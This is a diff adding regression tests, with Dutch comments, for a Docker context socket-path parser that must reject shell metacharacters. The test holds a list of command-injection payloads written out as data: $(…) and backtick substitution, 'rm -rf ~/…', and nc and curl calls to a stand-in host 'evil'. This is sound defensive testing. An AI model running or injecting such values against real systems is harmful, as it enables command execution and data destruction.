@@ -47,6 +47,33 @@ describe('parseDockerContextSocket (#81)', () => {
     expect(parseDockerContextSocket('[{}]')).toBeNull();
     expect(parseDockerContextSocket(JSON.stringify([{ Endpoints: {} }]))).toBeNull();
   });
+
+  // Regressie (#81, security): het pad belandt ONgequote in een `docker run -v
+  // <pad>:...` shell-commando. Een beïnvloedbare docker-context mag geen
+  // shell-metatekens kunnen binnensmokkelen -> command injection.
+  it('weigert paden met shell-metatekens (command injection)', () => {
+    const payloads = [
+      'unix:///tmp/$(touch /tmp/pwned)/.rd/docker.sock',
+      'unix:///tmp/`id`/.rd/docker.sock',
+      'unix:///tmp/x;rm -rf ~/.rd/docker.sock',
+      'unix:///tmp/x|nc evil 1/.rd/docker.sock',
+      'unix:///tmp/x && curl evil/.rd/docker.sock',
+      'unix:///tmp/x\n/.rd/docker.sock',
+      'unix:///home/a b/.rd/docker.sock',
+      'unix:///tmp/$HOME/.rd/docker.sock',
+    ];
+    for (const host of payloads) {
+      const json = JSON.stringify([{ Endpoints: { docker: { Host: host } } }]);
+      expect(parseDockerContextSocket(json), host).toBeNull();
+    }
+  });
+
+  it('laat gewone (veilige) absolute socketpaden ongemoeid', () => {
+    const json = JSON.stringify([
+      { Endpoints: { docker: { Host: 'unix:///home/toon/.rd/docker.sock' } } },
+    ]);
+    expect(parseDockerContextSocket(json)).toBe('/home/toon/.rd/docker.sock');
+  });
 });
 
 describe('isRancherDesktopSocket (#81)', () => {
